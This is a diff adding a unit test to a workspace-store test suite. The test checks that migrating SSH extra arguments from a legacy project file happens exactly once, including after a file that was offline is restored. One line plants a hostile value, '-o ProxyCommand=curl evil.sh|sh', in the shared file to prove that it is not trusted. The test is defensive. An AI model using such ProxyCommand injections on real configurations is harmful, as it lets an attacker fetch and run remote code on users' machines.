@@ -176,6 +176,41 @@ describe('one-time exec migration (pre-existing project files)', () => {
     const back = await new WorkspaceStore().load()
     expect(back.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
   })
+
+  it('within ONE store instance, a deferred ref that comes back migrates exactly once', async () => {
+    // The offline→online recovery inside a single, long-lived store: the entry was deferred (its
+    // file was gone at first load), so its id sat in execUnmigrated. When the file returns and is
+    // read again, that deferral must be cleared — otherwise save() never records execMigrated, the
+    // hoist re-runs on every full load, and a project.json swapped in later would be re-hoisted.
+    await writeLegacy('-o ProxyCommand=corp-proxy %h')
+    const gone = path.join(projRoot, '.nodeterm/project.json')
+    const keep = await fs.readFile(gone, 'utf-8')
+    await fs.rm(gone)
+
+    const store = new WorkspaceStore()
+    const offline = await store.load()
+    expect(offline.projects[0].unavailable).toBe(true) // deferred → id in execUnmigrated
+
+    await fs.writeFile(gone, keep) // disk is back
+    const online = await store.load() // SAME instance re-reads the now-readable ref
+    expect(online.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+
+    await store.save(online)
+    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
+    expect(index.entries[0].execMigrated).toBe(true) // deferral cleared → migration recorded once
+    expect(index.entries[0].localExec).toEqual({
+      'ssh-1': { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
+    })
+
+    // Now the migration is truly done: a hostile value put in the shared file afterward cannot be
+    // hoisted as trusted (proves it does NOT keep re-running).
+    const f = JSON.parse(await fs.readFile(gone, 'utf-8'))
+    f.nodes[0].ssh.extraArgs = '-o ProxyCommand=curl evil.sh|sh'
+    f.rev = 99
+    await fs.writeFile(gone, JSON.stringify(f))
+    const reloaded = await new WorkspaceStore().load()
+    expect(reloaded.projects[0].nodes[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+  })
 })
 
 describe('unavailable & corrupt refs', () => {
